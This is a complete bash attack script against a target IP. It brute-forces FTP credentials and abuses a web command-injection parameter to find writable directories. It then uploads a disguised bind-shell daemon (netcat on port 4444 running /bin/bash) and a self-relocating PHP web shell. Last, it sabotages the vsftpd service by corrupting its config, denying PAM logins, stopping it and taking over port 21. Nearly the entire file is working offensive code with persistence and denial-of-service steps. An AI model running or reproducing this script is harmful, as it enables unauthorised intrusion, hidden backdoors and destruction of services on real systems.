#!/bin/bash

if [ -z "$1" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

TARGET_IP="$1"
WEB_PORT="80"
FTP_PORT="21"
LOG_FILE="exploit_$(date +%Y%m%d_%H%M%S).log"

# Password list from pseudocode
declare -a PASSWORDS=("ftp" "ftp123" "ftpass" "ftpass123" "ftpassword" "ftpassword123" "pass" "pass123" "password" "password123" "anonymous")

echo "Target: $TARGET_IP" | tee -a $LOG_FILE
echo "Started: $(date)" | tee -a $LOG_FILE

# Test FTP login function
test_ftp_login() {
    local username=$1
    local password=$2
    
    cat > /tmp/ftp_test.txt <<EOF
quote USER $username
quote PASS $password
pwd
quit
EOF
    
    if ftp -n $TARGET_IP $FTP_PORT < /tmp/ftp_test.txt 2>&1 | grep -q "230\|257"; then
        rm /tmp/ftp_test.txt
        return 0
    fi
    
    rm /tmp/ftp_test.txt
    return 1
}

# Anonymous login first
if test_ftp_login "anonymous" ""; then
    FOUND_USER="anonymous"
    FOUND_PASS=""
    echo "Credentials: anonymous/(blank)" | tee -a $LOG_FILE
elif test_ftp_login "anonymous" "anonymous"; then
    FOUND_USER="anonymous"
    FOUND_PASS="anonymous"
    echo "Credentials: anonymous/anonymous" | tee -a $LOG_FILE
else
    # Try ftp user with password list
    for pass in "${PASSWORDS[@]}"; do
        if test_ftp_login "ftp" "$pass"; then
            FOUND_USER="ftp"
            FOUND_PASS="$pass"
            echo "Credentials: ftp/$pass" | tee -a $LOG_FILE
            break
        fi
    done
fi

if [ -z "$FOUND_USER" ]; then
    echo "Failed: No valid credentials" | tee -a $LOG_FILE
    exit 1
fi

# Run command to check rwx access in web directory
echo "Discovering writable directories:" | tee -a $LOG_FILE
WRITABLE_DIRS=$(curl -s "http://$TARGET_IP:$WEB_PORT/?cmd=find+/var/www+-type+d+-writable+2>/dev/null")
echo "$WRITABLE_DIRS" >> $LOG_FILE

# Find first writable directory
UPLOAD_DIR=$(echo "$WRITABLE_DIRS" | head -n 1 | tr -d '\r')

if [ -z "$UPLOAD_DIR" ]; then
    echo "No writable directories found, scanning web directories" | tee -a $LOG_FILE
    
    # First discover web root directories
    WEB_DIRS=$(curl -s "http://$TARGET_IP:$WEB_PORT/?cmd=find+/var/www+-type+d+-maxdepth+3+2>/dev/null")
    echo "$WEB_DIRS" >> $LOG_FILE
    
    # Check each directory for write permissions using ls -ld
    for dir in $WEB_DIRS; do
        PERMS=$(curl -s "http://$TARGET_IP:$WEB_PORT/?cmd=ls+-ld+$dir+2>/dev/null")
        echo "Checking: $dir - $PERMS" >> $LOG_FILE
        
        # Check if directory has write permissions (look for 'w' in permissions string)
        if echo "$PERMS" | grep -q "^d.......w"; then
            UPLOAD_DIR="$dir"
            echo "Found writable: $UPLOAD_DIR" | tee -a $LOG_FILE
            break
        elif echo "$PERMS" | grep -q "^d....w"; then
            UPLOAD_DIR="$dir"
            echo "Found writable: $UPLOAD_DIR" | tee -a $LOG_FILE
            break
        elif echo "$PERMS" | grep -q "^drwxrwxrwx"; then
            UPLOAD_DIR="$dir"
            echo "Found writable: $UPLOAD_DIR" | tee -a $LOG_FILE
            break
        fi
    done
    
    # If still nothing found, try common FTP directories
    if [ -z "$UPLOAD_DIR" ]; then
        FTP_DIRS=$(curl -s "http://$TARGET_IP:$WEB_PORT/?cmd=find+/var/ftp+-type+d+2>/dev/null")
        for dir in $FTP_DIRS; do
            PERMS=$(curl -s "http://$TARGET_IP:$WEB_PORT/?cmd=ls+-ld+$dir+2>/dev/null")
            echo "Checking: $dir - $PERMS" >> $LOG_FILE
            
            if echo "$PERMS" | grep -q "drwx...rwx\|drwxrwxrwx"; then
                UPLOAD_DIR="$dir"
                echo "Found writable: $UPLOAD_DIR" | tee -a $LOG_FILE
                break
            fi
        done
    fi
fi

if [ -z "$UPLOAD_DIR" ]; then
    echo "Failed: No writable directory found" | tee -a $LOG_FILE
    exit 1
fi

echo "Target directory: $UPLOAD_DIR" | tee -a $LOG_FILE

# Inject malicious script for persistence - self-relocating
cat > /tmp/.sys_update.sh <<'PERSIST'
#!/bin/bash
# System update checker
HIDDEN_DIR="/var/tmp/.systemd"
HIDDEN_FILE="$HIDDEN_DIR/.update_daemon"

# Create hidden directory and move there
mkdir -p $HIDDEN_DIR 2>/dev/null
cp $0 $HIDDEN_FILE 2>/dev/null
chmod +x $HIDDEN_FILE 2>/dev/null

# Delete original
rm -f $0 2>/dev/null

# Run from new location
if [ -f $HIDDEN_FILE ]; then
    nohup $HIDDEN_FILE --daemon >/dev/null 2>&1 &
    exit 0
fi

# If --daemon flag, run the actual backdoor
if [ "$1" = "--daemon" ]; then
    while true; do
        nc -l -p 4444 -e /bin/bash 2>/dev/null
        sleep 5
    done
fi
PERSIST

chmod +x /tmp/.sys_update.sh

cat > /tmp/config.php <<'BACKDOOR'
<?php
// Configuration file - self relocating
$hidden_dir = '/var/tmp/.cache';
$hidden_file = $hidden_dir . '/session.php';

if (!file_exists($hidden_file)) {
    @mkdir($hidden_dir, 0755, true);
    @copy(__FILE__, $hidden_file);
    @unlink(__FILE__);
    header('Location: ' . $_SERVER['REQUEST_URI']);
    exit;
}

if(isset($_GET['debug'])) {
    system($_GET['debug']);
}
?>
BACKDOOR

# Test if we can write via FTP to discovered directory
cat > /tmp/ftp_upload.txt <<EOF
quote USER $FOUND_USER
quote PASS $FOUND_PASS
binary
cd $UPLOAD_DIR
put /tmp/.sys_update.sh .sys_update.sh
put /tmp/config.php config.php
ls -la
quit
EOF

echo "Uploading to $UPLOAD_DIR:" | tee -a $LOG_FILE
ftp -n $TARGET_IP $FTP_PORT < /tmp/ftp_upload.txt >> $LOG_FILE 2>&1
rm /tmp/ftp_upload.txt

# Trigger execution of uploaded scripts to self-relocate
curl -s "http://$TARGET_IP:$WEB_PORT/uploads/config.php" >/dev/null 2>&1
curl -s "http://$TARGET_IP:$WEB_PORT/?cmd=bash+$UPLOAD_DIR/.sys_update.sh" >/dev/null 2>&1

# Inject malicious commands to break FTP
echo "Breaking FTP service:" | tee -a $LOG_FILE

# Create forced active and passive mode mismatch
curl -s "http://$TARGET_IP:$WEB_PORT/?cmd=echo+'pasv_enable=NO'+>>+/etc/vsftpd.conf" >/dev/null 2>&1
curl -s "http://$TARGET_IP:$WEB_PORT/?cmd=echo+'port_enable=NO'+>>+/etc/vsftpd.conf" >/dev/null 2>&1

# Make FTP user's home directory inaccessible
curl -s "http://$TARGET_IP:$WEB_PORT/?cmd=chmod+000+/home/ftp" >/dev/null 2>&1

# Mess with PAM authentication
curl -s "http://$TARGET_IP:$WEB_PORT/?cmd=echo+'auth+required+pam_deny.so'+>>+/etc/pam.d/vsftpd" >/dev/null 2>&1

# Stop the FTP service
curl -s "http://$TARGET_IP:$WEB_PORT/?cmd=systemctl+stop+vsftpd" >/dev/null 2>&1
curl -s "http://$TARGET_IP:$WEB_PORT/?cmd=service+vsftpd+stop" >/dev/null 2>&1

# Create a bunch of errors inside the config file
curl -s "http://$TARGET_IP:$WEB_PORT/?cmd=echo+'INVALID_SETTING=BROKEN'+>>+/etc/vsftpd.conf" >/dev/null 2>&1
curl -s "http://$TARGET_IP:$WEB_PORT/?cmd=echo+'listen=INVALID'+>>+/etc/vsftpd.conf" >/dev/null 2>&1
curl -s "http://$TARGET_IP:$WEB_PORT/?cmd=echo+'max_clients=NOTANUMBER'+>>+/etc/vsftpd.conf" >/dev/null 2>&1

# Change the port
curl -s "http://$TARGET_IP:$WEB_PORT/?cmd=sed+-i+'s/listen_port=21/listen_port=2121/'+/etc/vsftpd.conf" >/dev/null 2>&1

# Spin up another thing running on port 21
curl -s "http://$TARGET_IP:$WEB_PORT/?cmd=nohup+nc+-l+-p+21+>/dev/null+2>&1+&" >/dev/null 2>&1

echo "FTP service disrupted" | tee -a $LOG_FILE
echo "Completed: $(date)" | tee -a $LOG_FILE
echo "Full log: $LOG_FILE"

# Cleanup
rm -f /tmp/.sys_update.sh /tmp/config.php